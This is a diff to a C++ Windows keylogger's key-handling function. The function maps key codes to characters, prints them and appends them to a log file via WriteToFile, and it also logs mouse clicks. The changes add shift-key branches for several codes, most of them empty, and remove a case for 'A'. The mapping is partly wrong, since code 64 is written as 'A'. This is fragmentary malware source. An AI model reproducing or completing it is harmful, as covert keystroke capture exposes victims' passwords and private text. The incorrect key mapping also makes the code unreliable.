@@ -86,6 +86,10 @@ bool Key_is_Listed(WORD iKey)
 			std::cout << ":";
 			WriteToFile(":");
 		}
+		else
+		{
+
+		}
 		break;
 
 	case 59:
@@ -110,6 +114,35 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 	case 62:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+
+		}
+		break;
+
+	case 63:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			
+		}
+		break;
+
+	case 64:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << "A";
+			WriteToFile("A");
+		}
+		break;
+
+	case 65:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+
+		}
+		break;
+
+	case 66:
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 
@@ -177,12 +210,6 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile(" Delete ");
 		break;
 
-
-
-	case 'A':
-		std::cout << " A ";
-		WriteToFile(" A ");
-		break;
 
 	case VK_RBUTTON:
 		std::cout << "*mouse_right*";
